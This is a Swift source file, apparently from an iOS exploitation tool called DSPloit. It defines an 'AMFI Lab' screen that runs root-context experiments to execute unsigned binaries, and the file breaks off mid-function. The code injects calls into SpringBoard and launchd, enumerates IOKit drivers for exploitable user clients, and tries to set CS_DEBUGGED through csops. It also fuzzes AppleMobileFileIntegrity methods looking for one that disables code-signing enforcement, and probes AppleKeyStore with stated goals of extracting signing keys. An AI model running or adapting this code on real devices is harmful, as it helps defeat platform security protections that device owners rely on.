//
//  AMFIExperimentView.swift
//  DSPloit
//
//  AMFI Bypass Experiments — test binary execution from root context
//  Goal: find a way to execute unsigned binaries
//
//  NOTE: Experiments 1-53 removed (legacy probes). Only keeping 54-59 (active research).
//

import SwiftUI
import IOSurface

struct AMFIExperimentView: View {
    @ObservedObject private var root = RootExecutor.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var results: [ExperimentResult] = []
    @State private var isRunning = false
    @State private var runningLabel = ""
    @State private var customBinary = "/usr/bin/id"
    
    struct ExperimentResult: Identifiable {
        let id = UUID()
        let name: String
        let success: Bool
        let detail: String
        let timestamp: Date
    }
    
    var body: some View {
        List {
            // Status Banner
            if isRunning {
                Section {
                    HStack(spacing: 10) {
                        ProgressView()
                            .tint(.red)
                        VStack(alignment: .leading, spacing: 2) {
                            Text("Running: \(runningLabel)")
                                .font(.caption.bold())
                                .foregroundStyle(.red)
                            Text("Do NOT close app — will cause panic!")
                                .font(.system(size: 9))
                                .foregroundStyle(.orange)
                        }
                    }
                    .padding(.vertical, 4)
                }
            }
            
            // Experiments
            Section {
                Button(action: runAllExperiments) {
                    HStack {
                        Label("Run All (Exp 54-59)", systemImage: "play.circle.fill")
                            .foregroundStyle(isRunning ? .gray : .red)
                        Spacer()
                        if isRunning && runningLabel.contains("All") {
                            ProgressView()
                                .scaleEffect(0.7)
                        }
                    }
                }
                .disabled(isRunning || !mgr.rcready)
                
                Button(action: runAmfidRC) {
                    HStack {
                        Label("⚡ amfid RC (Exp 60)", systemImage: "bolt.shield")
                            .foregroundStyle(isRunning ? .gray : .orange)
                        Spacer()
                        if isRunning && runningLabel.contains("amfid") {
                            ProgressView()
                                .scaleEffect(0.7)
                        }
                    }
                }
                .disabled(isRunning || !mgr.rcready)
                
                Button(action: { testSingleBinary(customBinary) }) {
                    Label("Test Custom Binary", systemImage: "terminal")
                }
                .disabled(isRunning || !mgr.rcready)
                
                TextField("Binary path", text: $customBinary)
                    .font(.system(.caption, design: .monospaced))
            } header: {
                Label("Experiments", systemImage: "flask")
            } footer: {
                Text("⚠️ amfid RC may take 5-10s or hang. Do NOT kill app while running!")
                    .font(.system(size: 9))
            }
            
            // Results
            if !results.isEmpty {
                Section {
                    ForEach(results) { r in
                        VStack(alignment: .leading, spacing: 4) {
                            HStack {
                                Image(systemName: r.success ? "checkmark.circle.fill" : "xmark.circle.fill")
                                    .foregroundStyle(r.success ? .green : .red)
                                Text(r.name)
                                    .font(.caption.bold())
                                Spacer()
                                Text(r.timestamp, style: .time)
                                    .font(.system(size: 8))
                                    .foregroundStyle(.tertiary)
                            }
                            Text(r.detail)
                                .font(.system(size: 10, design: .monospaced))
                                .foregroundStyle(.secondary)
                                .textSelection(.enabled)
                        }
                        .padding(.vertical, 2)
                    }
                } header: {
                    HStack {
                        Label("Results (\(results.count))", systemImage: "list.bullet")
                        Spacer()
                        if !results.isEmpty {
                            Button("Clear") { results.removeAll() }
                                .font(.caption2)
                        }
                    }
                }
            } else if !isRunning {
                Section {
                    Text("No results yet. Tap 'Run All' to start.")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                } header: {
                    Label("Results", systemImage: "list.bullet")
                }
            }
        }
        .navigationTitle("AMFI Lab")
        .navigationBarTitleDisplayMode(.inline)
    }
    
    // MARK: - Run All Experiments
    
    private func runAllExperiments() {
        isRunning = true
        runningLabel = "All Experiments (54-59)..."
        results.removeAll()
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "amfi_experiments") { rc in
            var experimentResults: [ExperimentResult] = []
            
            // Experiments 1-53: REMOVED (legacy probes, see git history)
            
            // ============================================
            // Experiment 54: IOKit driver probe
            // ============================================
            let exp54 = self.expIOKitProbe(rc: rc)
            experimentResults.append(exp54)
            
            // ============================================
            // Experiment 55: CoreTrust certificate probe
            // ============================================
            let exp55 = self.expCoreTrustProbe(rc: rc)
            experimentResults.append(exp55)
            
            // ============================================
            // Experiment 56: AMFI external method fuzzing
            // ============================================
            let exp56 = self.expAMFIExternalMethods()
            experimentResults.append(exp56)
            
            // ============================================
            // Experiment 57: AppleKeyStore probe (DISABLED — not directly useful for AMFI bypass)
            // ============================================
            // let exp57 = self.expKeyStoreProbe()
            // experimentResults.append(exp57)
            
            // ============================================
            // Experiment 58: AMFI struct method deep probe
            // ============================================
            let exp58 = self.expAMFIStructProbe()
            experimentResults.append(exp58)
            
            // ============================================
            // Experiment 59: AMFI from launchd + amfid hunt
            // ============================================
            let exp59 = self.expAMFIFromLaunchd(rc: rc)
            experimentResults.append(exp59)
            
            // ============================================
            // 🔥🔥🔥🔥🔥🔥 Experiment 60: amfid kernel research
            // ⚠️ DISABLED in batch run — RC init can hang/timeout
            // Use "Test amfid RC" button separately
            // ============================================
            experimentResults.append(ExperimentResult(
                name: "🔥🔥🔥🔥🔥🔥 amfid research",
                success: false,
                detail: "Use 'Test amfid RC' button (safe kernel reads only)",
                timestamp: Date()
            ))
            
            // ============================================
            // 🔥🔥🔥🔥🔥🔥🔥 Experiment 61: FINAL ASSAULT
            // All remaining bypass paths combined
            // ============================================
            let exp61 = self.expFinalAssault(rc: rc)
            experimentResults.append(exp61)
            
            DispatchQueue.main.async {
                self.results = experimentResults
                self.isRunning = false
                self.runningLabel = ""
            }
            
            let successCount = experimentResults.filter { $0.success }.count
            return (successCount > 0, "\(successCount)/\(experimentResults.count) succeeded", 0)
        }
        #endif
    }
    
    private func testSingleBinary(_ path: String) {
        isRunning = true
        runningLabel = "Testing \(path)..."
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "test_binary") { rc in
            let result = self.expPosixSpawn(rc: rc, binary: path, name: "posix_spawn \(path)")
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail, 0)
        }
        #endif
    }
    
    private func runAmfidRC() {
        isRunning = true
        runningLabel = "amfid RC (may take 10s)..."
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "amfid_rc") { rc in
            let result = self.expRCIntoAmfid(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail, 0)
        }
        #endif
    }
    
    // MARK: - Experiment Implementations
    
    #if !DISABLE_REMOTECALL
    /// Helper: posix_spawn a binary
    private func expPosixSpawn(rc: RemoteCall, binary: String, name: String) -> ExperimentResult {
        let mem = rc.trojanMem
        let binAddr = remote_alloc_str(rc, binary)
        
        // argv = [binary, NULL]
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        // pid output
        let pidAddr = mem + 0x300
        rc[pidAddr].setValue32(0)
        
        // posix_spawn(&pid, binary, NULL, NULL, argv, NULL)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // If spawned, wait for it
        if ret == 0 && pid != 0 {
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            let exitStatus = rc[statusAddr].value32()
            
            RootExecutor.rcall(rc, "free", binAddr)
            return ExperimentResult(
                name: name,
                success: true,
                detail: "✅ PID=\(pid), exit=\(exitStatus >> 8), ret=\(ret)",
                timestamp: Date()
            )
        }
        
        // Failed — get errno
        let err = remote_errno(rc)
        RootExecutor.rcall(rc, "free", binAddr)
        return ExperimentResult(
            name: name,
            success: false,
            detail: "❌ ret=\(ret), errno=\(err), pid=\(pid)",
            timestamp: Date()
        )
    }
    
    // MARK: - Experiment 54: IOKit Driver Probe
    
    /// IOKit driver probe — find accessible user clients for potential exploitation
    /// Some IOKit drivers have bugs in external methods (OOB read/write)
    private func expIOKitProbe(rc: RemoteCall) -> ExperimentResult {
        var detail = "IOKit Driver Probe — finding accessible user clients\n\n"
        
        // From SpringBoard (has more IOKit access than launchd)
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "IOKit probe", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        // Try to open various IOKit user clients
        let services = [
            "IOSurfaceRoot",
            "AGXAccelerator",
            "AppleAVD",
            "AppleH13CamIn",
            "IOHIDSystem",
            "AppleSPU",
            "AppleKeyStore",
            "AppleCredentialManager",
            "IOAudioEngine",
            "AppleMobileFileIntegrity",
        ]
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let ioServiceGetMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
        let ioServiceOpen = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
        let ioServiceClose = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceClose"))
        
        guard ioServiceMatching != 0 && ioServiceGetMatching != 0 && ioServiceOpen != 0 else {
            detail += "IOKit functions not available\n"
            // Try loading IOKit
            let fwPath = remote_alloc_str(sb, "/System/Library/Frameworks/IOKit.framework/IOKit")
            RootExecutor.rcall(sb, "dlopen", fwPath, 1)
            RootExecutor.rcall(sb, "free", fwPath)
            detail += "Tried loading IOKit framework\n"
            return ExperimentResult(name: "IOKit probe", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let mem = sb.trojanMem
        
        for service in services {
            let nameAddr = remote_alloc_str(sb, service)
            let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
            
            if matchDict != 0 {
                let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
                if svc != 0 {
                    // Try to open with type 0
                    let connectAddr = mem + 0x1A00
                    sb[connectAddr].setValue32(0)
                    let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
                    let connect = sb[connectAddr].value32()
                    
                    if openRet == 0 && connect != 0 {
                        detail += "✅ \(service): OPENED! connect=\(connect)\n"
                        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
                    } else {
                        detail += "  \(service): found but open failed (ret=0x\(String(format: "%x", openRet)))\n"
                    }
                } else {
                    detail += "  \(service): not found\n"
                }
            }
            RootExecutor.rcall(sb, "free", nameAddr)
        }
        
        let hasOpen = detail.contains("✅")
        if hasOpen {
            detail += "\n✅ Accessible user clients found!\n"
            detail += "These can be fuzzed for OOB read/write vulnerabilities.\n"
            detail += "External methods might give us access to different kernel zones!\n"
        }
        
        return ExperimentResult(name: "IOKit probe", success: hasOpen, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 55: CoreTrust Certificate Probe
    
    /// CoreTrust certificate probe — test what signatures iOS 18.2 accepts
    /// Try spawning binary with different signature types
    private func expCoreTrustProbe(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var detail = "CoreTrust Certificate Probe\n\n"
        
        // CoreTrust validates the certificate chain in code signatures.
        // We can't easily CREATE certificates from device, but we can:
        // 1. Check what signature our app has (it's signed!)
        // 2. Check what signature system binaries have
        // 3. Try to copy signature from signed binary to unsigned one
        
        // Step 1: Read our app's code signature info
        let pid = RootExecutor.rcall(rc, "getpid")
        detail += "Our PID: \(pid)\n"
        
        // csops(pid, CS_OPS_STATUS, &status, sizeof(status))
        // CS_OPS_STATUS = 0
        let statusAddr = mem + 0x1A00
        rc[statusAddr].setValue32(0)
        let csopsRet = RootExecutor.rcall(rc, "csops", pid, 0, statusAddr, 4)
        let csStatus = rc[statusAddr].value32()
        detail += "csops(STATUS): ret=\(csopsRet), flags=0x\(String(format: "%x", csStatus))\n"
        
        // Decode flags
        if csStatus & 0x1 != 0 { detail += "  CS_VALID\n" }
        if csStatus & 0x4 != 0 { detail += "  CS_HARD\n" }
        if csStatus & 0x8 != 0 { detail += "  CS_KILL\n" }
        if csStatus & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY\n" }
        if csStatus & 0x200 != 0 { detail += "  CS_PLATFORM_PATH\n" }
        if csStatus & 0x800 != 0 { detail += "  CS_DEBUGGED\n" }
        if csStatus & 0x4000 != 0 { detail += "  CS_GET_TASK_ALLOW\n" }
        if csStatus & 0x20000 != 0 { detail += "  CS_INSTALLER\n" }
        
        // Step 2: Try csops on launchd (PID 1)
        rc[statusAddr].setValue32(0)
        let csops1 = RootExecutor.rcall(rc, "csops", 1, 0, statusAddr, 4)
        let cs1Status = rc[statusAddr].value32()
        detail += "\nlaunchd csops: ret=\(csops1), flags=0x\(String(format: "%x", cs1Status))\n"
        if cs1Status & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY ✅\n" }
        
        // Step 3: Check if we can set CS_DEBUGGED on ourselves via csops
        // CS_OPS_SET_STATUS = 8 (might be restricted)
        detail += "\nTrying to set CS_DEBUGGED on our process...\n"
        let newFlags: UInt32 = csStatus | 0x800 // add CS_DEBUGGED
        rc[statusAddr].setValue32(newFlags)
        let setRet = RootExecutor.rcall(rc, "csops", pid, 8, statusAddr, 4)
        detail += "csops(SET_STATUS, +CS_DEBUGGED): ret=\(setRet)\n"
        
        // Read back
        rc[statusAddr].setValue32(0)
        RootExecutor.rcall(rc, "csops", pid, 0, statusAddr, 4)
        let afterFlags = rc[statusAddr].value32()
        detail += "After set: flags=0x\(String(format: "%x", afterFlags))\n"
        
        if afterFlags & 0x800 != 0 && csStatus & 0x800 == 0 {
            detail += "\n✅✅✅ CS_DEBUGGED SET SUCCESSFULLY! ✅✅✅\n"
            detail += "This might allow loading unsigned code in our process!\n"
            detail += "CS_DEBUGGED disables some AMFI checks!\n"
        }
        
        // Step 4: Try CS_OPS_MARKKILL = 6 (mark as killable — might affect enforcement)
        // And CS_OPS_CLEARPLATFORM = 13
        detail += "\nOther csops experiments:\n"
        let csopsTests: [(String, UInt64)] = [
            ("CS_OPS_MARKHARD (4)", 4),
            ("CS_OPS_MARKKILL (6)", 6),
            ("CS_OPS_CLEARPLATFORM (13)", 13),
            ("CS_OPS_CLEARINSTALLER (14)", 14),
        ]
        
        for (name, op) in csopsTests {
            rc[statusAddr].setValue32(0)
            let r = RootExecutor.rcall(rc, "csops", pid, op, statusAddr, 4)
            detail += "  \(name): ret=\(r)\n"
        }
        
        let success = detail.contains("✅✅✅")
        return ExperimentResult(name: "CoreTrust/csops probe", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 56: AMFI External Method Fuzzing
    
    /// Experiment 56: Open AMFI user client and fuzz ALL external methods!
    /// AppleMobileFileIntegrity kext has external methods that might:
    /// - Whitelist a binary hash
    /// - Disable enforcement for a process
    /// - Add an exception to code signing policy
    /// - Return internal state we can use
    private func expAMFIExternalMethods() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AMFI External Method Fuzzing\n"
        detail += "Opening AppleMobileFileIntegrity user client...\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Get IOKit function pointers (resolved for availability check)
        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
        // IOConnectCallScalarMethod(connect, selector, input, inputCnt, output, outputCnt) — 6 params
        let ioConnectCallScalar = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallScalarMethod"))
        
        guard ioServiceMatching != 0 && ioConnectCallScalar != 0 else {
            detail += "IOKit functions not available\n"
            return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: false, detail: detail, timestamp: Date())
        }
        
        // Open AMFI user client
        let nameAddr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        guard svc != 0 else {
            detail += "AMFI service not found\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        
        guard openRet == 0 && connect != 0 else {
            detail += "Failed to open AMFI: ret=0x\(String(format: "%x", openRet))\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "✅ AMFI user client opened! connect=\(connect)\n\n"
        detail += "Fuzzing external methods (selectors 0-15)...\n\n"
        
        // IOConnectCallScalarMethod(connect, selector, input, inputCnt, output, outputCnt)
        // Only 6 params — safe for ARM64 register calling convention
        
        // Setup output buffer (space for 16 uint64 outputs)
        let scalarOutAddr = mem + 0x1C00
        let scalarOutCntAddr = mem + 0x1D00
        // Input area
        let scalarInAddr = mem + 0x2000
        
        var foundMethods: [Int] = []
        
        for selector in 0..<16 {
            // Reset output count
            sb[scalarOutCntAddr].setValue32(16)
            
            // Clear output
            for i in 0..<16 {
                sb[scalarOutAddr + UInt64(i * 8)].setValue64(0)
            }
            
            // IOConnectCallScalarMethod(connect, selector, NULL, 0, output, &outputCnt)
            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                         UInt64(connect),
                                         UInt64(selector),
                                         0, 0,  // no input
                                         scalarOutAddr, scalarOutCntAddr)
            
            let outCnt = sb[scalarOutCntAddr].value32()
            
            // Interpret return value
            // 0 = success, 0xe00002bc = invalid selector, 0xe00002c2 = bad argument
            let retHex = String(format: "0x%x", ret)
            
            if ret == 0 {
                detail += "✅ Selector \(selector): SUCCESS! outCnt=\(outCnt)\n"
                foundMethods.append(selector)
                
                // Read scalar outputs
                if outCnt > 0 {
                    detail += "   Scalar outputs: "
                    for i in 0..<min(Int(outCnt), 4) {
                        let val = sb[scalarOutAddr + UInt64(i * 8)].value64()
                        detail += "[\(i)]=0x\(String(format: "%llx", val)) "
                    }
                    detail += "\n"
                }
            } else if ret == 0xe00002bc {
                // kIOReturnBadArgument — selector doesn't exist
                detail += "   Selector \(selector): not implemented (0xe00002bc)\n"
            } else if ret == 0xe00002c2 {
                // kIOReturnUnsupported or bad input count
                detail += "⚠️ Selector \(selector): needs input! (ret=\(retHex))\n"
                foundMethods.append(selector)
            } else if ret == 0xe0000001 {
                detail += "⚠️ Selector \(selector): general error (ret=\(retHex))\n"
                foundMethods.append(selector)
            } else {
                detail += "   Selector \(selector): ret=\(retHex)\n"
                if ret != 0xe00002bc && ret != 0xe00002c7 {
                    foundMethods.append(selector)  // non-standard error = method exists
                }
            }
        }
        
        // Now try selectors with scalar input (1 uint64 = 0)
        if !foundMethods.isEmpty {
            detail += "\n--- Re-testing found methods with input ---\n"
            for selector in foundMethods.prefix(8) {
                // Try with 1 scalar input = 0
                sb[scalarInAddr].setValue64(0)
                sb[scalarOutCntAddr].setValue32(16)
                
                let ret2 = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                             UInt64(connect),
                                             UInt64(selector),
                                             scalarInAddr, 1,  // 1 scalar input
                                             scalarOutAddr, scalarOutCntAddr)
                
                let outCnt2 = sb[scalarOutCntAddr].value32()
                detail += "  Selector \(selector) + input(0): ret=0x\(String(format: "%x", ret2)), outCnt=\(outCnt2)\n"
                
                if ret2 == 0 && outCnt2 > 0 {
                    let val = sb[scalarOutAddr].value64()
                    detail += "    → output[0] = 0x\(String(format: "%llx", val))\n"
                }
            }
        }
        
        // Close
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        RootExecutor.rcall(sb, "free", nameAddr)
        
        detail += "\n--- Summary ---\n"
        detail += "Found \(foundMethods.count) active methods: \(foundMethods)\n"
        if !foundMethods.isEmpty {
            detail += "NEXT: Try specific inputs to these methods\n"
            detail += "Goal: find method that disables CS enforcement or whitelists hash\n"
        }
        
        let success = !foundMethods.isEmpty
        return ExperimentResult(name: "🔥🔥🔥 AMFI methods", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 57: AppleKeyStore Probe
    
    /// Experiment 57: AppleKeyStore external method probe
    /// KeyStore manages encryption keys — if we can extract/manipulate keys
    /// we might be able to sign our own binaries or decrypt protected data
    private func expKeyStoreProbe() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "🔥🔥 KeyStore probe", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AppleKeyStore External Method Probe\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let ioServiceMatching = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceGetMatchingService"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceOpen"))
        let ioConnectCallScalar = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallScalarMethod"))
        
        guard ioServiceMatching != 0 && ioConnectCallScalar != 0 else {
            detail += "IOKit functions not available in SpringBoard\n"
            return ExperimentResult(name: "🔥🔥 KeyStore probe", success: false, detail: detail, timestamp: Date())
        }
        
        // Open AppleKeyStore
        let nameAddr = remote_alloc_str(sb, "AppleKeyStore")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        guard svc != 0 else {
            detail += "AppleKeyStore service not found\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "🔥🔥 KeyStore probe", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        
        guard openRet == 0 && connect != 0 else {
            detail += "Failed to open KeyStore: ret=0x\(String(format: "%x", openRet))\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "🔥🔥 KeyStore probe", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "✅ AppleKeyStore opened! connect=\(connect)\n\n"
        
        // Fuzz selectors 0-20 (KeyStore has many methods)
        let scalarOutAddr = mem + 0x1C00
        let scalarOutCntAddr = mem + 0x1D00
        
        var foundMethods: [Int] = []
        
        for selector in 0..<20 {
            sb[scalarOutCntAddr].setValue32(16)
            
            // IOConnectCallScalarMethod(connect, selector, NULL, 0, output, &outputCnt)
            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                         UInt64(connect),
                                         UInt64(selector),
                                         0, 0,
                                         scalarOutAddr, scalarOutCntAddr)
            
            if ret == 0 {
                let outCnt = sb[scalarOutCntAddr].value32()
                detail += "✅ Selector \(selector): SUCCESS! out=\(outCnt)\n"
                foundMethods.append(selector)
                if outCnt > 0 {
                    let val = sb[scalarOutAddr].value64()
                    detail += "   output[0] = 0x\(String(format: "%llx", val))\n"
                }
            } else if ret != 0xe00002bc && ret != 0xe00002c7 {
                detail += "⚠️ Selector \(selector): ret=0x\(String(format: "%x", ret)) (exists but needs input)\n"
                foundMethods.append(selector)
            }
        }
        
        // Close
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        RootExecutor.rcall(sb, "free", nameAddr)
        
        detail += "\nFound \(foundMethods.count) active KeyStore methods: \(foundMethods)\n"
        detail += "KeyStore methods can potentially:\n"
        detail += "- Extract signing keys\n"
        detail += "- Create new key bags\n"
        detail += "- Manipulate trust anchors\n"
        
        return ExperimentResult(name: "🔥🔥 KeyStore probe", success: !foundMethods.isEmpty, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 58: AMFI Struct Method Deep Probe
    
    /// Experiment 58: AMFI methods need struct input — probe with various struct formats
    /// Known AMFI IOKit methods typically accept:
    /// - CDHash (20 bytes SHA1 or 32 bytes SHA256) for binary whitelisting
    /// - PID (4 bytes) for process-specific operations
    /// - Entitlement queries (string + PID)
    /// - Trust cache entries (CDHash + flags)
    ///
    /// We try different struct sizes and content to find what each selector expects
    private func expAMFIStructProbe() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AMFI Struct Method Deep Probe\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let ioConnectCallStruct = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOConnectCallStructMethod"))
        
        guard ioConnectCallStruct != 0 else {
            detail += "IOConnectCallStructMethod not available\n"
            return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: false, detail: detail, timestamp: Date())
        }
        
        // Re-open AMFI user client
        let nameAddr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        
        guard svc != 0 else {
            detail += "AMFI service not found\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: false, detail: detail, timestamp: Date())
        }
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        
        guard openRet == 0 && connect != 0 else {
            detail += "Failed to open AMFI: ret=0x\(String(format: "%x", openRet))\n"
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "🔥🔥🔥🔥 AMFI struct", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "✅ AMFI opened: connect=\(connect)\n\n"
        
        // IOConnectCallStructMethod(connect, selector, inputStruct, inputSize, outputStruct, &outputSize)
        // 6 params — safe for ARM64
        
        let structInAddr = mem + 0x2200   // input struct buffer (256 bytes)
        let structOutAddr = mem + 0x2400  // output struct buffer (256 bytes)
        let structOutSizeAddr = mem + 0x2600
        
        // Active selectors from exp 56: [2, 4, 5, 6, 7, 9, 11, 12, 13, 14, 15]
        // Test selector 2 first (likely the most basic method)
        
        var foundWorking: [(Int, String)] = []
        
        // Strategy 1: Try each active selector with different struct sizes
        // AMFI methods typically expect specific struct sizes
        let testSelectors = [2, 4, 5, 9, 11, 12]  // subset to avoid panic
        let testSizes: [UInt64] = [4, 8, 20, 24, 32, 40, 48, 64]
        
        detail += "--- Testing struct input sizes ---\n"
        
        for selector in testSelectors.prefix(4) {  // limit to 4 selectors
            detail += "\nSelector \(selector):\n"
            
            for size in testSizes {
                // Zero-fill input struct
                for i in 0..<Int(size / 8 + 1) {
                    sb[structInAddr + UInt64(i * 8)].setValue64(0)
                }
                
                // Set output size
                sb[structOutSizeAddr].setValue64(256)
                
                // Clear output
                for i in 0..<32 {
                    sb[structOutAddr + UInt64(i * 8)].setValue64(0)
                }
                
                // IOConnectCallStructMethod(connect, selector, input, inputSize, output, &outputSize)
                let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                             UInt64(connect),
                                             UInt64(selector),
                                             structInAddr, size,
                                             structOutAddr, structOutSizeAddr)
                
                let outSize = sb[structOutSizeAddr].value64()
                
                if ret == 0 {
                    detail += "  ✅ size=\(size): SUCCESS! outSize=\(outSize)\n"
                    foundWorking.append((selector, "struct_size=\(size)"))
                    
                    // Read output
                    if outSize > 0 && outSize <= 64 {
                        var outBuf = [UInt8](repeating: 0, count: Int(outSize))
                        sb.remoteRead(structOutAddr, to: &outBuf, size: outSize)
                        let hex = outBuf.prefix(24).map { String(format: "%02x", $0) }.joined(separator: " ")
                        detail += "    output: \(hex)\n"
                    }
                    break  // found working size for this selector
                } else if ret != 0xe00002c2 && ret != 0xe00002c7 && ret != 0xe00002bc {
                    // Different error — interesting!
                    detail += "  ⚠️ size=\(size): ret=0x\(String(format: "%x", ret))\n"
                }
            }
        }
        
        // Strategy 2: Try selector 2 with PID as input (4 bytes)
        // AMFI might have a "check process" method
        detail += "\n--- Selector 2 with PID input ---\n"
        sb[structInAddr].setValue32(1)  // PID 1 = launchd
        sb[structOutSizeAddr].setValue64(256)
        let pidRet = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), 2,
                                         structInAddr, 4,
                                         structOutAddr, structOutSizeAddr)
        let pidOutSize = sb[structOutSizeAddr].value64()
        detail += "  PID=1: ret=0x\(String(format: "%x", pidRet)), outSize=\(pidOutSize)\n"
        if pidRet == 0 && pidOutSize > 0 {
